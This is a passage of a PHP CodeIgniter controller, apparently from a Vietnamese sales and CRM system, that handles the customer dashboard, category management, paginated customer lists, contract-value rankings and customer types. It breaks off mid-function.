<?php
require_once(APPPATH . "controllers/Customers.php");

class BizCustomers extends Customers
{
    protected $_dateFormat = 'Y-m-d';
    protected $_data;

    protected $_paginator = array(
        'per_page' => 20,
        'uri_segment' => 3
    );
    public $_thong_bao = array(
        'required' => '%s. không được rỗng',
        'trim' => '%s. không được chứa khoảng trắng',
        '_check_phone_number' => '%s. không đúng định dạng ext: 888.888.888 or 888 888 888',
        'valid_email' => '%s. chưa đúng định dạng',
        'is_unique' => '%s. đã tồn tại',
        'validate_unique_custom' => '%s. đã tồn tại',
    );
    protected $_fileError = array();

    protected $_task_permission = null;

    function __construct()
    {

        parent::__construct();
        $this->load->library('MY_System_Info');
        $this->lang->load('quotes_contract');
        $this->load->helper('my_table_helper');
        $this->load->helper('download_helper');
        $this->load->helper("file");
        $this->load->library('MySession');
        $this->load->library('sale_lib');
        $this->load->helper('bizexcel');
        $this->load->helper('report');
        $this->load->model('Contract');
        $this->load->model('Sale');
        $this->load->model('Customer');
        #thay đổi thông tin validate

        $this->load->library("form_validation");
        $this->form_validation->set_message('required', '%s ' . lang('required'));
        $this->form_validation->set_message('is_unique', '%s không được trùng lặp.');
        $this->_fileError = array(
            'The filetype you are attempting to upload is not allowed' => 'File tải lên không đúng định dạng.',
            'The file you are attempting to upload is larger than the permitted size' => 'File tải lên không được quá 20 Mb'
        );
        $this->_task_permission = (new MY_System_Info())->get_permissions('customers');
    }

    public function history_trans()
    {
        $this->load->model('Task');
        $this->load->helper('sort_items');
        $person_id = $this->input->post('s_customer_id');
        $customer = $this->Customer->getCustomerByPeopleId(explode(',', $person_id));
        $data['records'] = [];
        if (!empty($customer)) {
            $transItems = $this->Task->listItem(['customers' => $customer['id'], 'paginator' => ['per_page' => 10000]], array('task' => 'grid-project'));
            $transTreeData = [];
            foreach ($transItems as $item) {
                $item['parent_id'] = '0';
                $transTreeData[] = $item;
                $itemChilds = $this->Task->listItem(['project_id' => $item['project_id'], 'paginator' => ['per_page' => 10000]], array('task' => 'task-by-project'));
                foreach ($itemChilds['ketqua'] as $child) {
                    $child['parent_id'] = $child['parent'];
                    $transTreeData[] = $child;
                }
            }
            $data['records'] = $transTreeData;
        }
        echo json_encode(array(
            'success' => true,
            'html' => $this->load->view('customers/partial/history_trans', $data, TRUE)
        ));
    }

    function dashboard_filter()
    {
        $rangeType = $this->input->post('range_type');
        $rangeDate = 14;
        switch ($rangeType) {
            case 'week':
            $rangeDate = 7;
            break;
            case 'month':
            $rangeDate = 30;
            break;
            default:
            break;
        }

        $dashboardData = $this->Customer->getDashboardData($rangeDate, ['soluong']);
        $dates = $this->dateRange(strtotime('-' . $rangeDate . ' day'), strtotime('now'));
        $chartSL = [];
        $actualTotal = $dashboardData['total'];
        foreach ($dates as $date) {
            $chartSL[$date] = (int)$actualTotal;
            foreach ($dashboardData['soluong'] as $record) {
                if ($date == $record['created_date']) {
                    $actualTotal += $record['total'];
                    $chartSL[$date] = $actualTotal;
                }
            }

        }
        echo json_encode(array(
            'success' => true,
            'TrendxAxis' => array_keys($chartSL),
            'TrendseriesData' => array_values($chartSL)
        ));
    }

    function index()
    {
        if (!$this->config->item("enable_customer_dashboard")) {
            redirect('/customers/listkh');
        }

        $data = [];
        $data['mode'] = 'view';
        if (in_array('add_update', $this->_task_permission)) {
            $data['mode'] = 'edit';
        }

        $rangeDate = 14;
        $dashboardData = $this->Customer->getDashboardData($rangeDate);

        $dates = $this->dateRange(strtotime('-' . $rangeDate . ' day'), strtotime('now'));
        $chartSL = [];
        $actualTotal = $dashboardData['total'];
        foreach ($dates as $date) {
            $chartSL[$date] = (int)$actualTotal;
            foreach ($dashboardData['soluong'] as $record) {
                if ($date == $record['created_date']) {
                    $actualTotal += $record['total'];
                    $chartSL[$date] = $actualTotal;
                }
            }
        }

        $data['chartSL'] = $chartSL;

        $totalCustomer = $actualTotal;

        $chartReference = [];
        foreach ($dashboardData['reference'] as $record) {
            $name = !empty($record['name']) ? $record['name'] : 'Chưa xác định';
            $chartReference[$name] = (int)$record['total'];
        }

        // $ContractValue = $this->Customer->getTopContractValue();

        $ContractValue = $this->Customer->top_contract();
        $data['top10ContractValue'] = $ContractValue;


        // echo "<pre>";
        // var_dump($ContractValue);die();
        // $topInCome = $this->Customer->getTopInCome();

        $topInCome = $this->Customer->top_customer();

        $data['top10Income'] = $topInCome;

        $data['chartReference'] = $chartReference;

        $data['top10balance'] = $dashboardData['top10balance'];
        $data['flop10balance'] = $dashboardData['flop10balance'];


        $total_customer = $this->Customer->get_number_type();


# NGÀNH NGHỀ KINH DOANH
        $b_option = array('table' => 'phppos_customers_business_type', 'column' => 'customer_id');
        $data['chart_business_type'] = $this->convert_type('phppos_business_type', 'business_type_id', $total_customer, $b_option);
# KHU VỰC ĐỊA LÝ 
        $g_option = array('table' => 'phppos_customers_geographical_area', 'column' => 'customer_id');
        $data['chart_geographycal_area'] = $this->convert_type('phppos_geographical_area', 'geographical_area_id', $total_customer, $g_option);

# HÌNH THỨC CÔNG TY

        $data['chart_company_form'] = $this->convert_type('phppos_company_form', 'company_form_id', $total_customer);

# LOẠI KHÁCH HÀNG

        $data['chart_tier'] = $this->convert_type('phppos_price_tiers', 'tier_id', $total_customer);

# NHÓM KHÁCH HÀNG

        $data['chartType'] = $this->convert_type('phppos_customers_type', 'type_customer', $total_customer);

        // echo "<pre>"; print_r($data); die();
        $this->load->view('customers/dashboard', $data);
    }


    protected function convert_type($table, $type, $total_customer, $option2 = null)
    {
        $c = $this->Customer->get_list_type($table);
        $total_customer = $total_customer ? $total_customer : 1;
        $count = $total_customer ? $total_customer : 1;


        foreach ($c as $key => &$value) {
            $value['y'] = $this->Customer->get_number_type($type, $value['id'], $option2) / $total_customer * 100;
            $value['total'] = $this->Customer->get_number_type($type, $value['id'], $option2);
            $count = $count - $value['total'];
        }

        $c[] = array('y' => $count / $total_customer * 100, 'total' => $count, 'name' => 'Chưa xác định');
        return $c;


    }


    protected function dateRange($first, $last, $step = '+1 day')
    {
        $dates = array();
        $current = $first;
        while ($current <= $last) {
            $dates[] = date($this->_dateFormat, $current);
            $current = strtotime($step, $current);
        }
        return $dates;
    }

    # quản lý danh mục
    function categories()
    {
        # $this->Customer->tao_moi_danh_muc_khach_hang();
        # $this->check_action_permission('manage_categories');
        # truyền dữ liệu ra view
        $this->check_action_permission('manage_categories');
        $data = $this->Customer->get_danh_muc_khach_hang();


        $danh_muc_tong_hop = $this->Customer->get_danh_muc_khach_hang();
        $this->load->view('customers/categories', $data);
    }

    function tao_moi_categories()
    {
        $this->check_action_permission('manage_categories');
        // danh mục cha
        $parrent_id = $this->input->post('parrent_id');
        // tên danh mục
        $category_name = $this->input->post('category_name');
        // bảng để thêm vào
        $customers_table = $this->input->post('customers_table');
        // gọi model thêm mới danh mục khách hàng
        $category_id = $this->input->post('category_id');
        if ($category_id) {
            // sửa danh mục truyền id của danh mục
            $this->Customer->tao_moi_danh_muc_khach_hang($category_name, $customers_table, $category_id);
            $iValid = false;
            $last_insert_id = $this->db->insert_id();
            echo $this->mo_danh_muc_con($iValid, $customers_table, $last_insert_id);
        } else if ($parrent_id) {
            $last_insert_id = $this->Customer->tao_moi_danh_muc_khach_hang($category_name, $customers_table, $category_id = false, $parrent_id);
            $iValid = TRUE;
            echo $this->mo_danh_muc_con($iValid, $customers_table, $last_insert_id);
        } else {
            $this->Customer->tao_moi_danh_muc_khach_hang($category_name, $customers_table);
            $iValid = false;
            echo $this->mo_danh_muc_con($iValid, $customers_table);
        }
    }

    # xóa danh mục
    function xoa_danh_muc_con()
    {
        $this->check_action_permission('manage_categories');
        # truyền id cần xóa
        $category_id = $this->input->post('category_id');
        $customers_table = $this->input->post('customers_table');
        $this->Customer->xoa_danh_muc_khach_hang($category_id, $customers_table);
        echo $this->mo_danh_muc_con();
    }

    # dùng để mở danh mục con
    function mo_danh_muc_con($iValid = false, $customers_table = null, $last_insert_id = null)
    {
        # mở danh mục con
        $result2 = '';
        $data['band'] = TRUE;
        $customers_table = isset($customers_table) ? $customers_table : $this->input->post('customers_table');
        $category_id = $this->input->post('category_id');
        $parrent_id = $this->input->post('parrent_id');
        # lưu lại vị trí bảng
        $data['customers_table'] = $customers_table;
        # nếu parrent_id = 0 hoặc rỗng
        # nếu có giá trị $parrent_id !=0
        if ($category_id) {
            # trả lại danh mục đã được chọn
            $data['danh_muc_con'] = $this->Customer->get_danh_muc_khach_hang($customers_table, 0);
            $result = $this->load->view('customers/categories_form_child', $data, TRUE);
            # tìm kiếm đối tượng có parrent_id = id;
            $parrent_id = $category_id;
            $data['danh_muc_con'] = $this->Customer->get_danh_muc_khach_hang($customers_table, $parrent_id);
            # chưa cho hiện danh thêm mới tại danh mục tiếp theo
            $data['band'] = false;
            $result2 = $this->load->view('customers/categories_form_child', $data, TRUE);
        } else {
            # nếu có thêm mới danh mục
            if ($last_insert_id) {
                $data['danh_muc_con'] = $this->Customer->get_danh_muc_khach_hang($customers_table, 0);
                $result = $this->load->view('customers/categories_form_child', $data, TRUE);
                # tìm kiếm đối tượng có parrent_id = id;
                # lấy ra danh mục con 2
                $data['danh_muc_con'] = $this->Customer->get_danh_muc_khach_hang($customers_table, $parrent_id);
                # chưa cho hiện danh thêm mới tại danh mục tiếp theo
                $data['band'] = false;
                $result2 = $this->load->view('customers/categories_form_child', $data, TRUE);
            } else {
                $data['danh_muc_con'] = $this->Customer->get_danh_muc_khach_hang($customers_table);
                $result = $this->load->view('customers/categories_form_child', $data, TRUE);
            }
        }
        echo json_encode(array('danh_muc_con' => $result, 'danh_muc_con_2' => $result2));
    }

    // get only 10 items for customers index
    function short_list_store()
    {

        $post = $this->input->post();
        #        $post['col'] = 'id';
        #        $post['order'] = 'asc';

        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {
            $categoryId = $this->input->post('category_id', -1);
            $category_child = $this->input->post('category_child', -1);

            # lây tên danh mục, nếu tìm kiếm theo danh mục cha
            if (isset($categoryId) && $categoryId != -1) {
                $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
                $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
                $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
                $arrParam['customers_table'] = $customers_table[0]['name'];
                $arrParam['category_child'] = $category_child;
                $arrParam['categoryId'] = $categoryId;
                $data['category_child'] = $category_child_total;
                $data['selected_category_child'] = $category_child;
                $data['category_child_ajax'] = $this->load->view('customers/categories_child_ajax', $data, true);
            }

            $key_filter = 'customer_index_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $this->_paginator['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            $this->_paginator['per_page'] = 10;
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['scope_of_view'] = $this->_scopeOfView;

            $config['base_url'] = base_url() . 'customers/short_list_store';
            $config['total_rows'] = $this->Customer->count_item($arrParam);

            $config['per_page'] = 10;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_item($arrParam);

            //get geographical
            $getGeographicalWithCustomerid = $this->db->select('*')->from('phppos_customers_geographical_area')->get()->result();
            $geographical_area_data = $this->db->select('*')->from('phppos_geographical_area')->get()->result();

//            var_dump(json_encode($items));die;
            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/short_list', array(
                'items' => $items,
                'getGeographical' => $getGeographicalWithCustomerid,
                'geographical_area_data' => $geographical_area_data
            ), true);

            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_birthday = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_birthday_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_balance = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_balance_filter', 'scope_of_view' => $this->_scopeOfView));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_birthday' => $count_birthday, 'count_balance' => $count_balance, 'count_tmp' => $count_tmp, 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : '');
            // echo "<pre>";print_r($result);
            echo json_encode($result);

        }
    }

    function list_store()
    {
        $post = $this->input->post();

        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {
            $categoryId = $this->input->post('category_id', -1);
            $category_child = $this->input->post('category_child', -1);

            if ($_SESSION['customers_selected_category']) {
                $categoryId = (int)$_SESSION['customers_selected_category'];
                $_SESSION['customers_selected_category'] = '';
            }
            if ($_SESSION['customers_selected_category_child'] || $_SESSION['customers_selected_category_child'] === 0) {
                $category_child = (int)$_SESSION['customers_selected_category_child'];
                $_SESSION['customers_selected_category_child'] = '';
            }
            # lây tên danh mục, nếu tìm kiếm theo danh mục cha
            if (isset($categoryId) && $categoryId != -1) {
                $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
                $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
                $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
                $category_child_total[] = [
                    'id' => 0,
                    'layer' => '1',
                    'name' => 'Không xác định'
                ];
                $arrParam['customers_table'] = $customers_table[0]['name'];
                $arrParam['category_child'] = $category_child;
                $arrParam['categoryId'] = $categoryId;
                $data['category_child'] = $category_child_total;
                $data['selected_category_child'] = $category_child;
                $data['category_child_ajax'] = $this->load->view('customers/categories_child_ajax', $data, true);
            }

            $key_filter = 'customer_index_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $this->_paginator['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;

            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['scope_of_view'] = $this->_scopeOfView;

            $config['base_url'] = base_url() . 'customers/list_store';
            $config['total_rows'] = $this->Customer->count_item($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_item($arrParam);
            // echo "<pre>";
            // var_dump($items);die();

            //get geographical
            $getGeographicalWithCustomerid = $this->db->select()->from('phppos_customers_geographical_area')->get()->result();
            $geographical_area_data = $this->db->select()->from('phppos_geographical_area')->get()->result();

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/list', array(
                'items' => $items,
                'getGeographical' => $getGeographicalWithCustomerid,
                'geographical_area_data' => $geographical_area_data
            ), true);

            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_birthday = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_birthday_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_balance = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_balance_filter', 'scope_of_view' => $this->_scopeOfView));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_birthday' => $count_birthday, 'count_balance' => $count_balance, 'count_tmp' => $count_tmp, 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : '');
            // echo "<pre>"; print_r($result); die();
            echo json_encode($result);


        }
    }

    function list_top_customer_value()
    {
        $post = $this->input->post();
        $current_page = 'topContractValue';
        $current_page = $this->uri->segment(3);

        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {
            $categoryId = $this->input->post('category_id', -1);
            $category_child = $this->input->post('category_child', -1);
            # lây tên danh mục, nếu tìm kiếm theo danh mục cha
            if (isset($categoryId) && $categoryId != -1) {
                $customers_table = $this->Customer->danh_muc_khach_hang_tong_hop($categoryId);
                $category_child_total = $this->Customer->get_all_danh_muc_khach_hang($customers_table[0]['name']);  # lấy ra tất cả dữ liệu trong bảng danh mục
                $category_child_total = $this->Customer->sap_xep_danh_muc_theo_thu_tu($category_child_total);   # sắp xếp dữ liệu theo cha và con
                $arrParam['customers_table'] = $customers_table[0]['name'];
                $arrParam['category_child'] = $category_child;
                $arrParam['categoryId'] = $categoryId;
                $data['category_child'] = $category_child_total;
                $data['selected_category_child'] = $category_child;
                $data['category_child_ajax'] = $this->load->view('customers/categories_child_ajax', $data, true);
            }

            $key_filter = 'customer_index_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $this->_paginator['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;

            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['scope_of_view'] = $this->_scopeOfView;

            $config['base_url'] = base_url() . 'customers/list_top_customer_value' . '/' . $current_page;

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $allItems = $this->Sale->getAllDataSale($arrParam);

            if ($current_page === 'topContractValue') {
                usort($items, function ($a, $b) {
                    return $b['total_all_raw'] - $a['total_all_raw'];
                });
                $items = $this->unique_multidim_array($items, 'customer_id');
            } else {
                $topIncomes = $this->groupContractValueByCustomerId($allItems);
                usort($topIncomes, function ($a, $b) {
                    return $b['total_all_raw'] - $a['total_all_raw'];
                });
                $items = $topIncomes;
            }

            $config['total_rows'] = count($items);

            $items = array_slice($items, ($arrParam['page'] - 1) * $config['per_page'], $config['per_page']);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/list_top_value', array('items' => $items, 'page' => $current_page), true);

            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_birthday = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_birthday_filter', 'scope_of_view' => $this->_scopeOfView));
            $count_balance = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_balance_filter', 'scope_of_view' => $this->_scopeOfView));

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination, 'count_birthday' => $count_birthday, 'count_balance' => $count_balance, 'count_tmp' => $count_tmp, 'category_child' => isset($data['category_child_ajax']) ? $data['category_child_ajax'] : '');

            echo json_encode($result);

        }
    }

    public function unique_multidim_array($array, $key)
    {
        $temp_array = array();
        $i = 0;
        $key_array = array();

        foreach ($array as $val) {
            if (!in_array($val[$key], $key_array)) {
                $key_array[$i] = $val[$key];
                $temp_array[$i] = $val;
            }
            $i++;
        }
        return $temp_array;
    }

    public function groupContractValueByCustomerId($array)
    {
        $temp_array = array();

        foreach ($array as $val) {
            if (isset($temp_array[$val['customer_id']])) {
                $temp_array[$val['customer_id']]['total_all_raw'] += $val['total_all_raw'];
                $temp_array[$val['customer_id']]['total_all'] = to_currency($temp_array[$val['customer_id']]['total_all_raw']);
                $temp_array[$val['customer_id']]['num_of_contract']++;
            } else {
                $temp_array[$val['customer_id']] = $val;
                $temp_array[$val['customer_id']]['num_of_contract'] = 1;
            }

        }

        return array_values($temp_array);
    }

    function type_list_store()
    {
        $post = $this->input->post();
        #        $post['col'] = 'customer_type_id';
        #        $post['keywords'] = 'code';
        #        $post['order'] = 'asc';
        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {
            $page = $this->uri->segment(3, 1);
            $key_filter = 'customer_type_list_filter';

            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);
            $arrParam['of_month'] = true;

            $config['base_url'] = base_url() . 'customers/type_list_store';
            $config['total_rows'] = $this->Customer->count_type_list($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            #$config['per_page'] = $arrParam['paginator']['per_page'] = 1;

            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->list_type_list($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $html = $this->load->view('customers/row/type_list', array('items' => $items, 'page' => $page), true);

            $result = array('count' => $config['total_rows'], 'html_string' => $html, 'pagination' => $pagination);
            echo json_encode($result);
        }
    }

    function type_list()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);

        $this->load->view("customers/type_list", $data);
    }

    function view_type_list($id)
    {
        $data = array('id' => $id);
        if ($id > 0) {
            $item = $this->Customer->get_customer_type_item(array('id' => $id));
            $data['item'] = $item;
        }

        $data['page'] = $this->uri->segment(4, 1);

        $this->load->view('customers/form_customer_type', $data);
    }

    function type_list_save()
    {
        $post = $this->input->post();
        $post['name'] = filter_trim_space($post['name']);
        $post['code'] = filter_trim_space($post['code']);
        $post['desc'] = filter_trim_space($post['desc']);
        $this->input->post = $post;
        $arrParams = array_merge($post, $this->input->get());

        if (!empty($post)) {
            if ($arrParams['id'] == -1) {
                $this->form_validation->set_rules('name', 'Tên', 'required|is_unique[customer_type.name]');
                $this->form_validation->set_rules('code', 'Mã', 'required|is_unique[customer_type.code]');
            } else {
                $this->form_validation->set_rules('name', 'Tên', 'required');
                $this->form_validation->set_rules('code', 'Mã', 'required');
            }

            if ($this->form_validation->run($this) == FALSE) {
                $errors = $this->form_validation->error_array();
                $flagError = true;
            }

            if ($arrParams['id'] != -1) {
                if (!isset($errors['name'])) {
                    $flag = $this->Customer->check_customer_type_field_exist('name', $arrParams['name'], $arrParams['id']);
                    if ($flag == true) {
                        $errors['name'] = 'Tên không được trùng.';
                        $flagError = true;
                    }
                }

                if (!isset($errors['code'])) {
                    $flag = $this->Customer->check_customer_type_field_exist('code', $arrParams['code'], $arrParams['id']);
                    if ($flag == true) {
                        $errors['code'] = 'Mã không được trùng.';
                        $flagError = true;
                    }
                }
            }

            if ($flagError == true) {
                $response = array('flag' => 'false', 'errors' => $errors);
            } else {
                $this->Customer->save_customer_type($arrParams, array('task' => 'update'));
                $response = array('flag' => 'true');

                $_SESSION['notice'] = 'Cập nhật thành công.';
            }

            echo json_encode($response);
        }
    }

    function type_list_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_customer_type($post['cid']);

            $response = array('flag' => 'true', 'msg' => 'Xóa thành công');
            echo json_encode($response);
        }
    }

    function add_customer_tmp_list()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $cid = $post['cid'];
            $customer_ids = $this->session->userdata('customer_tmp_ids');
            if (empty($customer_ids)) $customer_ids = array();
            foreach ($cid as $cus_id) {
                if (!in_array($cus_id, $customer_ids))
                    $customer_ids[] = $cus_id;
            }

            $this->session->set_userdata('customer_tmp_ids', $customer_ids);

            $count_tmp = $this->Customer->count_item_by_filter(array('key_filter' => 'customer_tmp_filter'));

            echo json_encode(array('count_tmp' => $count_tmp));
        }
    }

    function remove_customer_tmp_list()
    {
        $post = $this->input->post();
        #$post = array(1640);
        if (!empty($post)) {
            $cid = $post['cid'];
            $customer_ids = $this->session->userdata('customer_tmp_ids');
            if (empty($customer_ids)) $customer_ids = array();

            if (!empty($customer_ids)) {
                foreach ($cid as $cus_id) {
                    if (($key = array_search($cus_id, $customer_ids)) !== false) {
                        unset($customer_ids[$key]);
                    }
                }
            }

            $this->session->set_userdata('customer_tmp_ids', $customer_ids);
        }
    }

    function listkh()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $type = $this->input->get('type');
        $category_child = $this->input->get('category_child');

        # lấy danh mục tổng hợp
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        # truyền vào data danh mục cha
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        # danh mục con ban đầu là rỗng
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';

        if ($type) {
            $data['selected_category'] = $type;
            $_SESSION['customers_selected_category'] = $type;
        }

        if ($category_child) {
            if ($category_child == 'false') {
                $data['selected_category_child'] = 0;
                $_SESSION['customers_selected_category_child'] = 0;
            } else {
                $data['selected_category_child'] = $category_child;
                $_SESSION['customers_selected_category_child'] = $category_child;
            }

        }


        # $data['slb_customer_type'] = $this->Customer->item_select_customer_type();
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        // echo "<pre>"; print_r($data); die();
        $this->load->view("customers/list", $data);
    }

    //list top contract value
    function listTopValue()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        # lấy danh mục tổng hợp
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();

        # truyền vào data danh mục cha
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        # danh mục con ban đầu là rỗng
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';

        # $data['slb_customer_type'] = $this->Customer->item_select_customer_type();
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $data['page'] = 'topContractValue';

        $this->load->view("customers/list_top_value", $data);
    }

    // list top all contract value
    function listTopAllValue()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        # lấy danh mục tổng hợp
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();

        # truyền vào data danh mục cha
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        # danh mục con ban đầu là rỗng
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';

        # $data['slb_customer_type'] = $this->Customer->item_select_customer_type();
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $data['page'] = 'topAllContractValue';

        $this->load->view("customers/list_top_value", $data);
    }

    public function khach_hang_moi()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $this->load->view("customers/khach_hang_moi", $data);
    }

    public function khach_hang_tiem_nang()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $this->load->view("customers/khach_hang_tiem_nang", $data);
    }

    public function bao_gia_hop_dong()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $this->load->view("customers/bao_gia_hop_dong", $data);
    }

    public function da_ky_hop_dong()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $this->load->view("customers/da_ky_hop_dong", $data);
    }

    public function khach_hang_fail()
    {
        $data = array();
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $category = array();
        $category_result = $this->Customer->danh_muc_khach_hang_tong_hop();
        $data['category'] = $category_result;
        $data['selected_category'] = 'all';
        $data['category_child'] = array();
        $data['selected_category_child'] = 'all';
        $data['scope_of_view'] = $this->_scopeOfView;
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['employees'] = $employees;
        $this->load->view("customers/khach_hang_fail", $data);
    }

    function tmp_list_store()
    {
        $post = $this->input->post();
        #        $post['col'] = 'id';
        #        $post['order'] = 'asc';
        $arrParam = array_merge($post, $this->input->get());
        if (!empty($post)) {
            $key_filter = 'customer_tmp_filter';
            $_SESSION[$key_filter] = array();
            $arrParam['key_filter'] = $key_filter;
            $arrParam['paginator'] = $this->_paginator;
